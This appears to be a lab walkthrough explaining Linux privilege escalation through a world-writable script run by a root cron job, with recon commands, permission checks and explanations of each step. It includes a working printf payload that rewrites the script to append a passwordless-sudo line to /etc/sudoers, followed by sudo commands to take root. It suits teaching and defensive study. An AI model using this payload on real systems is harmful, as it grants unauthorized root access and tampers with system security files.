## üîç What Is a Cron Job?

- **Cron**: Linux time-based task scheduler  
- **Cron job**: Script/command scheduled to run automatically (e.g., backups, log rotation)  
- Defined in **crontab** files (`/etc/crontab`, `/etc/cron.d/`, user crontabs)

> üí° **Key Risk**: If a cron job runs as **root**, any script it executes runs with **root privileges**.
### ‚ùì Is the Shell Script the Cron Job?
- **No**. The **cron job** is the **scheduled task** (e.g., in `/etc/crontab`)  
- The **script** (`copy.sh`) is just a file the cron job executes  
- But since the script is **world-writable**, it‚Äôs the **attack vector**

---
## üéØ Attack Scenario

- System admin creates a **root-owned cron job** that executes a **world-writable shell script**  
- Attacker modifies the script ‚Üí gains **root execution**

---
## Step-by-Step Exploitation

### 1. Initial Recon
```bash
whoami          # student
groups          # student
crontab -l      # No student user cron jobs
```

> ‚ùì **But something is running as root!**  
> ‚Üí Found `/home/student/message` owned by root (`-rw-------`) ‚Üí inaccessible

---
### 2. Find the Cron Job
Search for references to the file:
```bash
cd /
grep -rnw /usr -e "/home/student/message"
```
- `-r`: recursive  
- `-n`: show line numbers  
- `-w`: match whole word  

‚úÖ Output:  
`/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message`

> üí° This means **line 2** of `copy.sh` contains the path ‚Äî not the full script.

---
### 3. Analyze the Script
```bash
ls -al /usr/local/share/copy.sh
# -rwxrwxrwx 1 root root ... ‚Üí WORLD-WRITABLE!
cat /usr/local/share/copy.sh
```
Content:
```bash
#!/bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
```

> ‚ö†Ô∏è **Critical Misconfiguration**:  
> Any user can **overwrite this script** ‚Üí next cron run = **arbitrary root command**
### ‚ùì What Does `ls -al` Do?
- `-a`: Show **hidden files** (starting with `.`)  
- `-l`: **Long format** (permissions, owner, size, timestamp)

---
### 4. Weaponize the Script
No editors (`vim`/`nano`) available ‚Üí use `printf`:
```bash
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

> üí° Why this payload?  
> - Adds `student` to sudoers with **NOPASSWD** ‚Üí instant privilege escalation  
> - Cleaner than reverse shells (no network needed)

---
### 5. Trigger & Escalate
Wait for cron job to run (or trigger manually if possible):
```bash
sudo -l
# Output: (root) NOPASSWD: ALL
sudo su
# Now root!
```

‚úÖ Success: Full root access.
### ‚ùì What Is `sudo -l`?
- Lists **allowed sudo commands** for current user  
- Critical for identifying **misconfigured sudo rights**
---
## ‚ö†Ô∏è Critical Notes
| Issue                      | Why It Matters                                       |
| -------------------------- | ---------------------------------------------------- |
| **World-writable scripts** | Allow any user to inject malicious code              |
| **Root cron jobs**         | Execute scripts with full root privileges            |
| **No file editors**        | Use `echo`/`printf` for payload delivery             |
| **Sudoers abuse**          | More reliable than reverse shells in restricted envs |
